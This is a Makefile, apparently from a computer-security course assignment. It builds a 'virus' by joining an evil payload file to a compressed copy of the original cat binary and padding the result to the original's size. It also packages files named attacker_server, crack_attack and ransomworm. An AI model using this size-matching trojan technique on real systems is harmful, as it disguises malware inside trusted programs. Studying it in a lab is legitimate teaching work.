all:
	touch virus
	rm virus
	cat cat.ori | xz > cat.xz
	cat cat.evil \
		| perl -pe "s/###/$$(cat cat.evil | wc -c | tr -d ' ')/" \
		| perl -pe "s/#####/$$(cat cat.xz | wc -c | tr -d ' ')/" \
		> virus
	perl -e "print(\"\x00\" x $$(($$(cat cat.ori | wc -c) - $$(cat virus | wc -c) - 4)))" >> virus
	perl -e 'print("\xde\xad\xbe\xaf")' >> virus
	rm cat.xz
	chmod +x attacker_server cat.evil cat.ori crack_attack ransomworm submit.sh virus
pack:
	zip 109550150.zip attacker_server cat.evil cat.ori crack_attack ransomworm submit.sh virus Makefile